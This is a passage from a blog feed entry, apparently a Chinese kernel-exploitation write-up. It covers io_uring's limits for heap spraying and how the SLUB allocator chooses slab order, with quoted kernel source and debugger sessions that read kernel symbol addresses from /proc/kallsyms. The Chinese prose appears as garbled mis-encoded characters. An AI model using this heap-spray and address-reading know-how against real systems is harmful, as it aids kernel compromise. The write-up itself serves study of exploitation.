    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å…¶å®åœ¨ä»¥å‰å·²ç»å¤šæ¬¡é‡è§è¿‡&lt;code&gt;protobuf&lt;/code&gt;äº†ï¼Œä½†æ˜¯éƒ½ä¸å¤ªåœ¨æ„å› ä¸ºæ€»æ„Ÿè§‰ä¼šåƒmuslåº“ä¸€æ ·ï¼Œå­˜æ´»ä¸€æ®µæ—¶é—´åå°±æ¶ˆå¤±äº†ã€‚æ‰€</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="UAF" scheme="https://cv196082.gitee.io/tags/UAF/"/>
    
    <category term="protobuf" scheme="https://cv196082.gitee.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>å‘pipe_bufferè¯´yesï¼</title>
    <link href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/"/>
    <id>https://cv196082.gitee.io/2023/05/24/pipe-buffer/</id>
    <published>2023-05-24T08:39:35.000Z</published>
    <updated>2023-05-24T08:39:41.227Z</updated>
    
    <content type="html"><![CDATA[<p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230510125707322.png"                      alt="image-20230510125707322"                ></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>èµ·å› æ˜¯å¢¨æ™šé¸¢å¤§ä½¬çš„ä¸€å¥å›å¤ï¼Œä¸è¿‡æˆ‘è¿™é‡Œè¿˜æ²¡å°è¯•æŒ–æ˜æ–°çš„ä¸œè¥¿ï¼Œæ›´å¤šçš„æ˜¯å¯¹å¢¨æ™šé¸¢ä½¬çš„å†…å®¹åšé€‚åˆè‡ªå·±ç†è§£çš„æ€»ç»“ã€‚å¯ä»¥çœ‹åˆ°æ ‡ç­¾ä¸­è¿˜æœ‰ä¸€ä¸ªä¸Šä¸€ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»çš„<code>io_uring</code>ï¼Œè¿™é‡Œå°±å…ˆè¯´è¯´ã€‚</p><p><del>ä¸‡å­—è­¦å‘Šï¼ï¼ï¼</del></p><h2 id="io-uringåœ¨å †å–·ä¸­çš„å±€é™æ€§"><a href="#io-uringåœ¨å †å–·ä¸­çš„å±€é™æ€§" class="headerlink" title="io_uringåœ¨å †å–·ä¸­çš„å±€é™æ€§"></a>io_uringåœ¨å †å–·ä¸­çš„å±€é™æ€§</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __io_account_mem(struct user_struct *user, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> page_limit, cur_pages, new_pages;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don&#x27;t allow more pages than we can safely lock */</span></span><br><span class="line">page_limit = rlimit(RLIMIT_MEMLOCK) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">cur_pages = atomic_long_read(&amp;user-&gt;locked_vm);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">new_pages = cur_pages + nr_pages;</span><br><span class="line"><span class="keyword">if</span> (new_pages &gt; page_limit)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125; <span class="keyword">while</span> (!atomic_long_try_cmpxchg(&amp;user-&gt;locked_vm,</span><br><span class="line">  &amp;cur_pages, new_pages));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘è¿›è¡Œä¸€æ¬¡å †å–·è¿‡åï¼Œå¹¶ä½¿ç”¨updateå»ä¿®æ”¹å†…å®¹æ˜¯ä¼šè¿”å›é”™è¯¯-12ï¼Œåˆ™æ˜¯åœ¨ä¸Šé¢çš„å‡½æ•°ä¸­ï¼Œ<code>new_page</code>è¶…è¿‡äº†å¯ä»¥å®‰å…¨lockçš„pageæ•°é‡ï¼Œä¹Ÿå°±æ˜¯<code>new_pages &gt; page_limit</code>å¯¼è‡´çš„ã€‚</p><p>è€Œä¸Šé¢è¿™ä¸ªå‡½æ•°æœ€åˆæ˜¯ç”±<code>io_sqe_buffer_register</code>å‡½æ•°è°ƒç”¨çš„ï¼Œæ‰€ä»¥ä¸å¹¸çš„æ˜¯åœ¨å¯¹<code>io_uring</code>è¿›è¡Œåˆ†é…çš„æ—¶å€™å°±è¦å¼€å§‹è€ƒè™‘äº†ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬å¹³æ—¶åŠ¨ä¸åŠ¨å°±è¦é¢å¯¹4096æ¬¡ä¹‹ç±»çš„å¤§èŒƒå›´å †å–·æ—¶<code>io_uring</code>å°±æ˜¾å¾—æœ‰ç‚¹å„¿åŠ›ä¸ä»å¿ƒäº†ã€‚</p><p>ä¸è¿‡é™¤äº†ä»¥ä¸Šè¿™æ ·ä¸€ç‚¹ç¼ºç‚¹<code>io_uring</code>çš„è¡¨ç°ä¾æ—§æ˜¯ä»¤äººæ»¡æ„çš„ã€‚</p><h2 id="slabåˆ†é…æºç åˆ†æ"><a href="#slabåˆ†é…æºç åˆ†æ" class="headerlink" title="slabåˆ†é…æºç åˆ†æ"></a>slabåˆ†é…æºç åˆ†æ</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåˆ†é…slabçš„æœºåˆ¶ä¸º<code>buddy system</code>æœºåˆ¶è¿›è¡Œçš„ã€‚è€Œè¿›è¡Œåˆ†é…çš„æœ€ç»ˆå‡½æ•°ä¸º<code>alloc_slab_page</code>å‡½æ•°è¿›è¡Œåˆ†é…ï¼Œå¹¶ä¸”å¤§å®¶éƒ½çŸ¥é“<code>buddy system</code>åˆ†é…æ—¶å¤§å°ä¸º<code>PAGE_SIZE * pow(2,order)</code>ï¼Œæ‰€ä»¥orderçš„ç”±æ¥å°±æ˜¾å¾—å°¤ä¸ºé‡è¦äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">oo_order</span><span class="params">(struct kmem_cache_order_objects x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x.x &gt;&gt; OO_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct slab *<span class="title">alloc_slab_page</span><span class="params">(<span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node,</span></span></span><br><span class="line"><span class="params"><span class="function">struct kmem_cache_order_objects oo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order = oo_order(oo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">folio = (struct folio *)alloc_pages(flags, order);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">folio = (struct folio *)__alloc_pages_node(node, flags, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!folio)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">slab = folio_slab(folio);</span><br><span class="line">__folio_set_slab(folio);</span><br><span class="line"><span class="comment">/* Make the flag visible before any changes to folio-&gt;mapping */</span></span><br><span class="line">smp_wmb();</span><br><span class="line"><span class="keyword">if</span> (page_is_pfmemalloc(folio_page(folio, <span class="number">0</span>)))</span><br><span class="line">slab_set_pfmemalloc(slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨<code>alloc_slab_page</code>å‡½æ•°ä¸­ä½¿ç”¨orderæ˜¯åœ¨ooä¸­ï¼Œè€Œè¿™ä¸ªooè¿™æ—¶<code>kmem_cache</code>ç»“æ„ä½“ä¸­çš„æˆå‘˜ã€‚</p><h3 id="kmem-cache-create-usercopyæµç¨‹"><a href="#kmem-cache-create-usercopyæµç¨‹" class="headerlink" title="kmem_cache_create_usercopyæµç¨‹"></a>kmem_cache_create_usercopyæµç¨‹</h3><p><code>kmem_cache_create_usercopy</code>ç”¨æ¥æ³¨å†Œä¸€ä¸ªcacheï¼Œæ‰€ä»¥ä»–ä¹Ÿä¼šåˆ†é…ä¸€ä¸ªslabä¾›ä»–è‡ªå·±ä½¿ç”¨ï¼Œä¸è¿‡åˆ†é…çš„æ—¶é—´ç‚¹æ˜¯åœ¨è¿™ä¸ªcacheä¸­ç¬¬ä¸€æ¬¡ç”³è¯·objectçš„æ—¶å€™è§¦å‘çš„ã€‚è€Œ<code>kmem_cache_create_usercopy</code>å‡½æ•°ä¸»è¦æ˜¯å¯¹slabçš„åˆå§‹åŒ–ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†æˆ‘ä»¬æ¯”è¾ƒå…³æ³¨çš„<code>order</code>äº†ã€‚</p><p>å› ä¸ºå‰åŠéƒ¨åˆ†çš„å‡½æ•°éƒ½æ²¡æœ‰ç›´æ¥å’Œ<code>order</code>äº§ç”Ÿå…³ç³»ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç»™ä¸€ä¸‹å¤§å®¶è°ƒç”¨è¿ä¸è´´æºç å ç¯‡å¹…äº†ã€‚</p><p><code>kmem_cache_create_usercopy</code>=&gt;<code>create_cache</code>=&gt;<code>__kmem_cache_create</code>=&gt;<code>kmem_cache_open</code>=&gt;<code>calculate_sizes</code></p><h4 id="calculate-sizeså‡½æ•°"><a href="#calculate-sizeså‡½æ•°" class="headerlink" title="calculate_sizeså‡½æ•°"></a>calculate_sizeså‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">calculate_sizes</span><span class="params">(struct kmem_cache *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size = s-&gt;object_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line">order = calculate_order(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (order)</span><br><span class="line">s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA32)</span><br><span class="line">s-&gt;allocflags |= GFP_DMA32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">s-&gt;oo = oo_make(order, size);</span><br><span class="line">s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨å‡½æ•°æœ€åè¿™éƒ¨åˆ†å°±æ˜¯å¯¹ooçš„èµ‹å€¼ï¼Œæ‰€ä»¥ç†æ‰€åº”å½“å»<code>calculate_order</code>ç†æ¸…é€»è¾‘ã€‚</p><h4 id="calculate-orderå‡½æ•°"><a href="#calculate-orderå‡½æ•°" class="headerlink" title="calculate_orderå‡½æ•°"></a>calculate_orderå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment"> * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment"> * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment"> * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">min_objects = slub_min_objects;</span><br><span class="line"><span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment"> * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment"> * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment"> * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment"> * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment"> * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment"> * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nr_cpus = num_present_cpus();</span><br><span class="line"><span class="keyword">if</span> (nr_cpus &lt;= <span class="number">1</span>)</span><br><span class="line">nr_cpus = nr_cpu_ids;</span><br><span class="line">min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">max_objects = order_objects(slub_max_order, size);</span><br><span class="line">min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (min_objects &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fraction;</span><br><span class="line"></span><br><span class="line">fraction = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">while</span> (fraction &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">order = calc_slab_order(size, min_objects,</span><br><span class="line">slub_max_order, fraction);</span><br><span class="line"><span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line">fraction /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">min_objects--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We were unable to place multiple objects in a slab. Now</span></span><br><span class="line"><span class="comment"> * lets see if we can place a single object there.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">order = calc_slab_order(size, <span class="number">1</span>, slub_max_order, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Doh this slab cannot be placed using slub_max_order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">order = calc_slab_order(size, <span class="number">1</span>, MAX_ORDER, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (order &lt; MAX_ORDER)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line"><span class="keyword">return</span> -ENOSYS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°æœ€ç»ˆçš„orderæ˜¯ç”±<code>calc_slab_order</code>å‡½æ•°ç”Ÿæˆçš„ã€‚è€Œè¿™é‡Œçš„<code>min_objects</code>å˜é‡å¯ä»¥çœ‹åˆ°æ˜¯ç”±<code>slub_min_objects</code>èµ‹å€¼çš„ã€‚è¿™ä¸ªå…¨å±€å˜é‡çš„å«ä¹‰æ˜¯ï¼šæ¯ä¸ªslabçš„æœ€å°objectæ•°é‡ï¼Œåœ¨æ²¡æœ‰é…ç½®çš„æƒ…å†µä¸‹æ˜¯0ã€‚ä¸è¿‡å¯ä»¥çœ‹åˆ°å¦‚æœæ˜¯0çš„è¯ä¼šè¿›å…¥åˆ°ç´§æ¥ç€çš„ifè¯­å¥å†…ï¼Œå†…éƒ¨çš„<code>nr_cpu_ids</code>å˜é‡çš„å€¼æ˜¯å¤„ç†å™¨æ•°ã€‚fls å¯ä»¥è·å–å‚æ•°çš„æœ€é«˜æœ‰æ•ˆ bit çš„ä½æ•°ï¼Œæ¯”å¦‚ fls(0)=0ï¼Œfls(1)=1ï¼Œfls(4) = 3ã€‚å¦‚æœå½“å‰ç³»ç»Ÿä¸­æœ‰4ä¸ªcpuï¼Œé‚£ä¹ˆ min_object çš„åˆå§‹å€¼ä¸º 4*(3+1) = 16ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep slub_min_objects</span><br><span class="line">ffffffff8a23b2d0 t __cfi_setup_slub_min_objects</span><br><span class="line">ffffffff8a23b2e0 t setup_slub_min_objects</span><br><span class="line">ffffffff8a4348af t __setup_str_setup_slub_min_objects</span><br><span class="line">ffffffff8a45e460 t __setup_setup_slub_min_objects</span><br><span class="line">ffffffff8b3d5fbc b slub_min_objects</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff8b3d5fbc</span><br><span class="line">0xffffffff8b3d5fbc:0x00000000</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep nr_cpu_ids</span><br><span class="line">ffffffff97f73fa8 D nr_cpu_ids</span><br><span class="line">ffffffff98025f10 T __cfi_setup_nr_cpu_ids</span><br><span class="line">ffffffff98025f20 T setup_nr_cpu_ids</span><br><span class="line">ffffffff990f3098 b rcu_init_geometry.old_nr_cpu_ids</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff97f73fa8</span><br><span class="line">0xffffffff97f73fa8:0x00000004</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ä¸Šè¿°æ­¥éª¤æŸ¥çœ‹ä¹‹åå¯ä»¥çœ‹åˆ°<code>nr_cpu_ids</code>çš„å€¼ä¸º4ï¼Œæ‰€ä»¥è¿™é‡Œçš„<code>min_object</code>çš„å€¼ä¸º<code>0x10</code>ã€‚</p><p>è€Œå‡½æ•°ä¸­<code>fraction</code>æ˜¯å¯¹äºç¢ç‰‡çš„ä¸€ç§æŒ‡æ ‡ã€‚ç¢ç‰‡å¤§å°ä¸èƒ½è¶…è¿‡ (slabæ‰€å å†…å­˜å¤§å° / fraction)ï¼Œfraction å€¼è¶Šå¤§ï¼Œslab ä¸­æ‰€èƒ½å®¹å¿çš„ç¢ç‰‡å°±è¶Šå°ã€‚</p><h4 id="calc-slab-orderå‡½æ•°"><a href="#calc-slab-orderå‡½æ•°" class="headerlink" title="calc_slab_orderå‡½æ•°"></a>calc_slab_orderå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((<span class="number">1UL</span> &lt;&lt; l) &lt; v)</span><br><span class="line">l++;</span><br><span class="line"><span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline __attribute_const__ <span class="keyword">int</span> <span class="title">get_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> BITS_PER_LONG - PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt; (<span class="number">1UL</span> &lt;&lt; PAGE_SHIFT))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ilog2((size) - <span class="number">1</span>) - PAGE_SHIFT + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">size--;</span><br><span class="line">size &gt;&gt;= PAGE_SHIFT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 32</span></span><br><span class="line"><span class="keyword">return</span> fls(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> fls64(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc_slab_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> fract_leftover)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_order = slub_min_order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (order_objects(min_order, size) &gt; MAX_OBJS_PER_PAGE)</span><br><span class="line"><span class="keyword">return</span> get_order(size * MAX_OBJS_PER_PAGE) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (order = max(min_order, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_order(min_objects * size));</span><br><span class="line">order &lt;= max_order; order++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> slab_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> rem;</span><br><span class="line"></span><br><span class="line">rem = slab_size % size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rem &lt;= slab_size / fract_leftover)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span 